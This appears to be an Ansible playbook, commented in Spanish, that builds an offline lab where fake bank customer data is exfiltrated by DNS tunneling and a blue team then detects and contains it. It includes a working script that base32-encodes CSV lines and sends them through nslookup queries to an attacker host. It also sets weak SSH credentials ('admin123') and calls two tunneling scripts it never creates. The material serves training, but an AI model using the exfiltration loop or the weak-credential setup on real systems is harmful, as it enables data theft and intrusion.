---
# ==============================================================================
# Escenario Exfiltracion - Configuracion Post-Clonado
# ==============================================================================
# Este playbook se ejecuta en cada maquina despues del clonado.
# NO hay conexion a internet disponible.
#
# FLUJO DEL ATAQUE:
#   1. Crear archivo CSV con 100 registros de clientes en db-srv
#   2. Iniciar servidor DNS en attack-ws
#   3. Desde db-srv, iniciar cliente DNS tunneling
#   4. Exfiltrar datos del CSV via consultas DNS
#   5. blue-team-ws captura trafico DNS con tcpdump
# ==============================================================================

- name: "Preparar datos sensibles en db-srv"
  hosts: db-srv
  gather_facts: yes
  become: yes
  tasks:
    - name: "Crear directorio de datos"
      ansible.builtin.file:
        path: /var/data
        state: directory
        mode: "0755"

    - name: "Crear script generador de datos de clientes"
      ansible.builtin.copy:
        dest: /opt/generar_clientes.py
        mode: "0755"
        content: |
          #!/usr/bin/env python3
          """
          Generador de datos de clientes ficticios - Banco del Sol
          Solo para fines educativos
          """
          import csv
          import random

          random.seed(42)

          nombres = ["Juan", "Maria", "Carlos", "Ana", "Pedro", "Laura", "Diego", "Sofia",
                    "Martin", "Camila", "Lucas", "Valentina", "Mateo", "Isabella", "Sebastian",
                    "Emma", "Nicolas", "Mia", "Alejandro", "Daniela", "Pablo", "Gabriela",
                    "Andres", "Constanza", "Felipe", "Josefina", "Tomas", "Lucia", "Benjamin",
                    "Catalina", "Mateo", "Antonia", "Santiago", "Florencia", "Lucas", "Manuela",
                    "Diego", "Josefina", "Martin", "Isidora", "Felipe", "Agustina", "Alonso",
                    "Sofia", "Benjamin", "Emilia", "Sebastian", "Isabella", "Matias", "Mia",
                    "Vicente", "Emma", "Joaquin", "Catalina", "Tomas", "Antonia", "Gabriel",
                    "Valentina", "Lucas", "Camila", "Mateo", "Daniela", "Sebastian", "Lucia",
                    "Benjamin", "Sofia", "Nicolas", "Isabella", "Diego", "Mia", "Martin",
                    "Emma", "Pablo", "Manuela", "Mateo", "Antonia", "Andres", "Catalina",
                    "Felipe", "Florencia", "Alejandro", "Valentina", "Tomas", "Camila",
                    "Santiago", "Daniela", "Lucas", "Isidora", "Benjamin", "Agustina"]

          apellidos = ["Garcia", "Lopez", "Rodriguez", "Martinez", "Sanchez", "Fernandez",
                      "Torres", "Ramirez", "Diaz", "Moreno", "Alvarez", "Romero", "Hernandez",
                      "Flores", "Gonzalez", "Perez", "Torres", "Rivera", "Gomez", "Gutierrez"]

          output_file = "/var/data/clientes.csv"

          with open(output_file, 'w', newline='') as f:
              writer = csv.writer(f)
              writer.writerow(["cedula", "nombre", "apellido", "email", "telefono", "direccion", "numero_cuenta", "saldo", "tipo_cuenta"])

              for i in range(100):
                  nombre = random.choice(nombres)
                  apellido = random.choice(apellidos)
                  cedula = f"{random.randint(10000000, 99999999)}"
                  email = f"{nombre.lower()}.{apellido.lower()}@email.com"
                  telefono = f"099{random.randint(1000000, 9999999)}"
                  direccion = f"Av. {random.choice(['Principal', 'Secundaria', 'Central', 'Norte', 'Sur'])} {random.randint(1, 1000)}"
                  numero_cuenta = f"{random.randint(100000000, 999999999)}"
                  saldo = round(random.uniform(1000, 500000), 2)
                  tipo_cuenta = random.choice(["Caja de Ahorro", "Cuenta Corriente", "Plazo Fijo"])

                  writer.writerow([cedula, nombre, apellido, email, telefono, direccion, numero_cuenta, saldo, tipo_cuenta])

          print(f"[+] {100} registros de clientes generados en {output_file}")

    - name: "Generar datos de clientes"
      ansible.builtin.command:
        cmd: python3 /opt/generar_clientes.py

    - name: "Verificar datos generados"
      ansible.builtin.shell: |
        echo "=== Primeras 5 lineas del CSV ==="
        head -6 /var/data/clientes.csv
        echo ""
        echo "=== Total de registros ==="
        wc -l /var/data/clientes.csv

    - name: "Crear usuario admin para SSH"
      ansible.builtin.user:
        name: admin
        password: "{{ 'admin123' | password_hash('sha512', salt='bhusalt', rounds=5000) }}"
        shell: /bin/bash
        groups: sudo
        create_home: yes

    - name: "Habilitar login SSH con password"
      block:
        - name: "Buscar archivos de configuracion SSH"
          ansible.builtin.find:
            paths: /etc/ssh/sshd_config.d
            file_type: file
          register: ssh_config

        - name: "Ajustar configuracion SSH"
          ansible.builtin.lineinfile:
            path: "{{ item.path }}"
            regex: "^\\s*PasswordAuthentication"
            line: "PasswordAuthentication yes"
          with_items:
            - "{{ ssh_config['files'] }}"
            - { path: '/etc/ssh/sshd_config' }

    - name: "Habilitar y iniciar servicio SSH"
      ansible.builtin.service:
        name: ssh
        state: started
        enabled: yes

    - name: "Configurar DNS para usar attack-ws como servidor DNS"
      ansible.builtin.copy:
        dest: /etc/resolv.conf
        content: |
          nameserver {{ hostvars['attack-ws']['ansible_default_ipv4']['address'] | default('10.0.0.1') }}
          search lab

- name: "Configurar attack-ws como servidor DNS"
  hosts: attack-ws
  gather_facts: yes
  become: yes
  tasks:
    - name: "Obtener IP de db-srv"
      ansible.builtin.set_fact:
        db_srv_ip: "{{ hostvars['db-srv']['ansible_default_ipv4']['address'] | default('10.0.0.3') }}"

    - name: "Configurar dnsmasq como servidor DNS"
      ansible.builtin.copy:
        dest: /etc/dnsmasq.conf
        content: |
          # Configuracion dnsmasq - Banco del Sol DNS Tunneling
          listen-address=0.0.0.0
          bind-interfaces
          domain=bancodelsol.lab
         mx-record=bancodelsol.lab,mail.bancodelsol.lab,10
          txt-record=bancodelsol.lab,"DNS Tunnel Server"
          local=/bancodelsol.lab/

    - name: "Iniciar dnsmasq"
      ansible.builtin.service:
        name: dnsmasq
        state: started
        enabled: yes
      ignore_errors: yes

    - name: "Iniciar servidor DNS tunneling en background"
      ansible.builtin.shell: |
        nohup python3 /opt/dnscat2_server.py &>/var/log/dns_tunnel.log &
      async: 10
      poll: 0

    - name: "Crear script de monitoreo de exfiltracion"
      ansible.builtin.copy:
        dest: /opt/monitor_exfiltration.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Monitor de Exfiltracion DNS - Banco del Sol
          # Detecta actividad de DNS tunneling

          echo "=== Monitor de Exfiltracion DNS - Banco del Sol ==="
          echo "Presione Ctrl+C para detener"
          echo ""

          while true; do
            # Verificar trafico DNS inusual
            echo "--- Estadisticas DNS ---"
            netstat -un | grep :53 | wc -l
            echo "consultas DNS activas"

            # Verificar consultas TXT inusuales
            echo "--- Consultas TXT recientes ---"
            tcpdump -i any -nn port 53 -c 10 2>/dev/null | grep TXT | tail -5

            sleep 10
          done

    - name: "Iniciar monitor de exfiltracion"
      ansible.builtin.shell: |
        nohup /opt/monitor_exfiltration.sh &>/dev/null &
      async: 10
      poll: 0

- name: "Configurar db-srv para exfiltrar datos"
  hosts: db-srv
  gather_facts: yes
  become: yes
  tasks:
    - name: "Crear script de exfiltracion"
      ansible.builtin.copy:
        dest: /opt/exfiltrate.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Exfiltracion DNS Tunneling - Banco del Sol
          # ADVERTENCIA: Solo para fines educativos

          ATTACKER_IP="{{ hostvars['attack-ws']['ansible_default_ipv4']['address'] | default('10.0.0.1') }}"
          DATA_FILE="/var/data/clientes.csv"

          echo "============================================"
          echo "  EXFILTRACION DNS TUNNELING"
          echo "  Banco del Sol - Datos Sensibles"
          echo "============================================"
          echo ""
          echo "[*] Objetivo: Exfiltrar $DATA_FILE via DNS"
          echo "[*] Servidor DNS: $ATTACKER_IP"
          echo ""

          # Verificar archivo de datos
          if [ ! -f "$DATA_FILE" ]; then
            echo "[!] Archivo no encontrado: $DATA_FILE"
            exit 1
          fi

          # Leer y exfiltrar datos
          echo "[*] Iniciando exfiltracion..."
          python3 /opt/iodine_client.py "$ATTACKER_IP" "$DATA_FILE"

          echo ""
          echo "[+] Exfiltracion completada"

    - name: "Crear script de exfiltracion simplificado"
      ansible.builtin.copy:
        dest: /opt/exfiltrate_simple.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Exfiltracion DNS simplificada - Banco del Sol
          ATTACKER_IP="{{ hostvars['attack-ws']['ansible_default_ipv4']['address'] | default('10.0.0.1') }}"
          DATA_FILE="/var/data/clientes.csv"

          echo "[*] Exfiltrando datos via DNS queries..."

          # Leer datos y enviar via nslookup
          while IFS= read -r line; do
            # Codificar linea en base32
            encoded=$(echo -n "$line" | base32 | tr -d '=')
            # Enviar via DNS query
            nslookup "${encoded:0:63}.bancodelsol.lab" "$ATTACKER_IP" &>/dev/null
            sleep 0.05
          done < "$DATA_FILE"

          echo "[+] Exfiltracion completada"

- name: "Configurar blue-team-ws para deteccion"
  hosts: blue-team-ws
  gather_facts: yes
  become: yes
  tasks:
    - name: "Obtener IPs de servidores"
      ansible.builtin.set_fact:
        attack_ws_ip: "{{ hostvars['attack-ws']['ansible_default_ipv4']['address'] | default('10.0.0.1') }}"
        db_srv_ip: "{{ hostvars['db-srv']['ansible_default_ipv4']['address'] | default('10.0.0.3') }}"

    - name: "Crear script de analisis DNS"
      ansible.builtin.copy:
        dest: /opt/analyze_dns.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Analisis DNS Tunneling - Banco del Sol
          # Detecta y analiza trafico DNS sospechoso

          echo "============================================"
          echo "  ANALISIS DNS TUNNELING"
          echo "  Banco del Sol - Equipo Azul"
          echo "============================================"
          echo ""

          # Fase 1: Capturar trafico DNS
          echo "[*] Fase 1: Capturando trafico DNS..."
          sudo timeout 30 tcpdump -i any -nn port 53 -w /tmp/dns_capture.pcap

          # Fase 2: Analizar trafico
          echo "[*] Fase 2: Analizando trafico DNS..."
          echo ""
          echo "--- Estadisticas de protocolos ---"
          sudo tshark -r /tmp/dns_capture.pcap -q -z io,phs

          echo ""
          echo "--- Consultas DNS por tipo ---"
          sudo tshark -r /tmp/dns_capture.pcap -q -z dns,tree

          echo ""
          echo "--- Consultas TXT (posible tunneling) ---"
          sudo tshark -r /tmp/dns_capture.pcap -Y "dns.qry.type == 16" 2>/dev/null | head -20

          echo ""
          echo "--- IPs mas consultadas ---"
          sudo tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name 2>/dev/null | cut -d. -f1 | sort | uniq -c | sort -rn | head -10

          echo ""
          echo "============================================"
          echo "  FIN DEL ANALISIS"
          echo "============================================"

    - name: "Crear script de deteccion en tiempo real"
      ansible.builtin.copy:
        dest: /opt/detect_dns_tunnel.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Deteccion en tiempo real de DNS Tunneling
          # Banco del Sol

          echo "=== Deteccion DNS Tunneling - Banco del Sol ==="
          echo "Monitoreando trafico DNS..."
          echo ""

          # Capturar y analizar trafico en tiempo real
          sudo tcpdump -i any -nn port 53 -l 2>/dev/null | while read line; do
            # Detectar consultas TXT inusuales
            if echo "$line" | grep -q "TXT"; then
              echo "[!] ALERTA: Consulta TXT detectada: $line"
            fi

            # Detectar subdominios largos (posible encoded data)
            subdomain=$(echo "$line" | awk '{print $NF}' | cut -d. -f1)
            if [ ${#subdomain} -gt 30 ]; then
              echo "[!] ALERTA: Subdominio sospechoso (largo: ${#subdomain}): $subdomain"
            fi
          done

    - name: "Iniciar deteccion DNS tunneling"
      ansible.builtin.shell: |
        nohup /opt/detect_dns_tunnel.sh &>/var/log/dns_detection.log &
      async: 10
      poll: 0

    - name: "Crear script de respuesta a incidente"
      ansible.builtin.copy:
        dest: /opt/response_dns_tunnel.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Respuesta a incidente - DNS Tunneling
          # Banco del Sol

          echo "============================================"
          echo "  RESPUESTA A INCIDENTE"
          echo "  DNS Tunneling - Banco del Sol"
          echo "============================================"
          echo ""

          # Fase 1: Identificar datos comprometidos
          echo "[*] Fase 1: Identificando datos comprometidos..."
          ssh admin@{{ db_srv_ip | default('10.0.0.3') }} "cat /var/data/clientes.csv | wc -l"
          echo "registros de clientes potencialmente comprometidos"

          # Fase 2: Bloquear DNS tunneling
          echo "[*] Fase 2: Bloqueando DNS tunneling..."
          sudo iptables -A OUTPUT -p udp --dport 53 -d {{ attack_ws_ip | default('10.0.0.1') }} -j DROP
          sudo iptables -A OUTPUT -p tcp --dport 53 -d {{ attack_ws_ip | default('10.0.0.1') }} -j DROP

          # Fase 3: Aislar db-srv
          echo "[*] Fase 3: Aislando db-srv..."
          ssh admin@{{ db_srv_ip | default('10.0.0.3') }} "sudo iptables -A OUTPUT -j DROP; sudo iptables -I OUTPUT -d {{ attack_ws_ip | default('10.0.0.1') }} -j DROP"

          echo ""
          echo "[+] Contencion completada"
          echo "[*] Revisar /var/data/clientes.csv para ver datos comprometidos"
